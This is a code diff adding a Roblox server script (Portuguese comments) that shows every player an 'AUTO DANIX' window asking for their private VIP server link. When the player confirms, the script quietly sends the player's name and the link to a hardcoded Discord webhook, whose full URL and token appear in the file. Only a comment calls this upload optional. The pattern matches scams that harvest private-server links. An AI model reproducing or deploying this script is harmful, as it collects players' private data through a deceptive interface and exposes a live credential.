@@ -1,0 +1,254 @@
+-- Serverscript (colocar em ServerScriptService)
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
+local TeleportService = game:GetService("TeleportService")
+
+-- Webhook URL
+local WEBHOOK_URL = "https://canary.discord.com/api/webhooks/1442899179780440144/4MSUKbOu7pZQnpUiZKT5Rx5Vb5b2FB04skjkA_6zO2YpGNRC5b7uN_VArMPWxRSWA"
+
+-- Função para criar a GUI principal
+local function createAutoDanixGUI(player)
+    local playerGui = player:WaitForChild("PlayerGui")
+    
+    -- Criar ScreenGui principal
+    local screenGui = Instance.new("ScreenGui")
+    screenGui.Name = "AutoDanixGUI"
+    screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+    screenGui.ResetOnSpawn = false
+    
+    -- Frame principal
+    local mainFrame = Instance.new("Frame")
+    mainFrame.Name = "MainFrame"
+    mainFrame.Size = UDim2.new(0, 350, 0, 200)
+    mainFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
+    mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 35)
+    mainFrame.BackgroundTransparency = 0.1
+    mainFrame.BorderSizePixel = 0
+    mainFrame.Parent = screenGui
+    
+    -- Arredondar frame
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 15)
+    corner.Parent = mainFrame
+    
+    -- Adicionar borda ao frame
+    local frameStroke = Instance.new("UIStroke")
+    frameStroke.Color = Color3.fromRGB(100, 100, 200)
+    frameStroke.Thickness = 3
+    frameStroke.Parent = mainFrame
+    
+    -- Título "AUTO DANIX"
+    local titleLabel = Instance.new("TextLabel")
+    titleLabel.Name = "Title"
+    titleLabel.Size = UDim2.new(1, 0, 0, 50)
+    titleLabel.Position = UDim2.new(0, 0, 0, 0)
+    titleLabel.BackgroundColor3 = Color3.fromRGB(35, 35, 45)
+    titleLabel.BorderSizePixel = 0
+    titleLabel.Text = "AUTO DANIX"
+    titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    titleLabel.TextSize = 24
+    titleLabel.Font = Enum.Font.GothamBold
+    titleLabel.Parent = mainFrame
+    
+    -- Arredondar apenas o topo do título
+    local titleCorner = Instance.new("UICorner")
+    titleCorner.CornerRadius = UDim.new(0, 15)
+    titleCorner.Parent = titleLabel
+    
+    -- Texto "enter you vip server link"
+    local instructionLabel = Instance.new("TextLabel")
+    instructionLabel.Name = "Instruction"
+    instructionLabel.Size = UDim2.new(1, -40, 0, 30)
+    instructionLabel.Position = UDim2.new(0, 20, 0, 55)
+    instructionLabel.BackgroundTransparency = 1
+    instructionLabel.Text = "enter you vip server link"
+    instructionLabel.TextColor3 = Color3.fromRGB(200, 200, 255)
+    instructionLabel.TextSize = 16
+    instructionLabel.Font = Enum.Font.Gotham
+    instructionLabel.TextXAlignment = Enum.TextXAlignment.Left
+    instructionLabel.Parent = mainFrame
+    
+    -- Caixa de texto para o link do VIP server
+    local linkTextBox = Instance.new("TextBox")
+    linkTextBox.Name = "VipLinkInput"
+    linkTextBox.Size = UDim2.new(1, -40, 0, 40)
+    linkTextBox.Position = UDim2.new(0, 20, 0, 90)
+    linkTextBox.BackgroundColor3 = Color3.fromRGB(40, 40, 55)
+    linkTextBox.BorderSizePixel = 0
+    linkTextBox.PlaceholderText = "https://www.roblox.com/games/... or server link code"
+    linkTextBox.Text = ""
+    linkTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
+    linkTextBox.TextSize = 14
+    linkTextBox.Font = Enum.Font.Gotham
+    linkTextBox.ClearTextOnFocus = false
+    linkTextBox.Parent = mainFrame
+    
+    -- Arredondar a caixa de texto
+    local textBoxCorner = Instance.new("UICorner")
+    textBoxCorner.CornerRadius = UDim.new(0, 8)
+    textBoxCorner.Parent = linkTextBox
+    
+    -- Adicionar borda à caixa de texto
+    local textBoxStroke = Instance.new("UIStroke")
+    textBoxStroke.Color = Color3.fromRGB(80, 80, 180)
+    textBoxStroke.Thickness = 2
+    textBoxStroke.Parent = linkTextBox
+    
+    -- Botão de confirmar
+    local confirmButton = Instance.new("TextButton")
+    confirmButton.Name = "ConfirmButton"
+    confirmButton.Size = UDim2.new(1, -40, 0, 35)
+    confirmButton.Position = UDim2.new(0, 20, 0, 145)
+    confirmButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+    confirmButton.BorderSizePixel = 0
+    confirmButton.Text = "✅ CONFIRMAR LINK"
+    confirmButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+    confirmButton.TextSize = 16
+    confirmButton.Font = Enum.Font.GothamBold
+    confirmButton.Parent = mainFrame
+    
+    -- Arredondar botão
+    local buttonCorner = Instance.new("UICorner")
+    buttonCorner.CornerRadius = UDim.new(0, 8)
+    buttonCorner.Parent = confirmButton
+    
+    -- Adicionar borda ao botão
+    local buttonStroke = Instance.new("UIStroke")
+    buttonStroke.Color = Color3.fromRGB(255, 255, 255)
+    buttonStroke.Thickness = 2
+    buttonStroke.Parent = confirmButton
+    
+    -- Função para processar o link
+    local function processVipLink()
+        local vipLink = linkTextBox.Text
+        local cleanLink = string.gsub(vipLink, "^%s*(.-)%s*$", "%1")  -- Remove espaços extras
+        
+        if cleanLink == "" then
+            -- Mostrar mensagem de erro
+            confirmButton.Text = "❌ DIGITE UM LINK!"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
+            wait(2)
+            confirmButton.Text = "✅ CONFIRMAR LINK"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+            return
+        end
+        
+        -- Verificar se é um link válido do Roblox
+        local isValidLink = string.find(string.lower(cleanLink), "roblox") ~= nil
+        
+        if isValidLink then
+            -- Link válido - processar
+            confirmButton.Text = "✅ LINK VÁLIDO!"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(80, 120, 255)
+            
+            -- Aqui você pode adicionar a lógica para processar o link VIP
+            print("🔗 Link VIP processado: " .. cleanLink)
+            
+            -- Enviar para webhook (opcional)
+            local currentTime = os.date("%d/%m/%Y %H:%M:%S")
+            local payload = {
+                embeds = {{
+                    title = "⚡ AUTO DANIX - LINK VIP",
+                    color = 0x00FF00,
+                    fields = {
+                        {
+                            name = "👤 Jogador:",
+                            value = player.Name,
+                            inline = true
+                        },
+                        {
+                            name = "🔗 Link VIP:",
+                            value = cleanLink,
+                            inline = false
+                        },
+                        {
+                            name = "🕐 Horário:",
+                            value = currentTime,
+                            inline = true
+                        }
+                    },
+                    footer = {
+                        text = "Auto Danix VIP System"
+                    }
+                }}
+            }
+            
+            -- Tentar enviar para webhook
+            pcall(function()
+                local encodedPayload = HttpService:JSONEncode(payload)
+                game:HttpGet(
+                    WEBHOOK_URL .. "?wait=true", 
+                    {
+                        method = "POST",
+                        headers = {
+                            ["Content-Type"] = "application/json"
+                        },
+                        body = encodedPayload
+                    }
+                )
+            end)
+            
+            wait(2)
+            confirmButton.Text = "✅ CONFIRMAR LINK"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+            linkTextBox.Text = ""
+        else
+            -- Link inválido
+            confirmButton.Text = "❌ LINK INVÁLIDO!"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(180, 60, 80)
+            wait(2)
+            confirmButton.Text = "✅ CONFIRMAR LINK"
+            confirmButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+        end
+    end
+    
+    -- Conectar clique do botão confirmar
+    confirmButton.MouseButton1Click:Connect(processVipLink)
+    
+    -- Também processar quando pressionar Enter na textbox
+    linkTextBox.FocusLost:Connect(function(enterPressed)
+        if enterPressed then
+            processVipLink()
+        end
+    end)
+    
+    -- Efeitos hover
+    confirmButton.MouseEnter:Connect(function()
+        confirmButton.BackgroundColor3 = Color3.fromRGB(80, 200, 100)
+    end)
+    
+    confirmButton.MouseLeave:Connect(function()
+        confirmButton.BackgroundColor3 = Color3.fromRGB(60, 180, 80)
+    end)
+    
+    -- Efeito na textbox
+    linkTextBox.Focused:Connect(function()
+        textBoxStroke.Color = Color3.fromRGB(100, 200, 255)
+    end)
+    
+    linkTextBox.FocusLost:Connect(function()
+        textBoxStroke.Color = Color3.fromRGB(80, 80, 180)
+    end)
+    
+    -- Adicionar à interface do jogador
+    screenGui.Parent = playerGui
+    
+    print("⚡ Auto Danix VIP GUI carregada para " .. player.Name)
+end
+
+-- Criar GUI para todos os jogadores
+Players.PlayerAdded:Connect(function(player)
+    player.CharacterAdded:Connect(function()
+        wait(2)
+        createAutoDanixGUI(player)
+    end)
+end)
+
+-- Para jogadores já no jogo
+for _, player in ipairs(Players:GetPlayers()) do
+    if player.Character then
+        createAutoDanixGUI(player)
+    end
+end
+
+print("⚡ Auto Danix VIP System carregado com sucesso!")
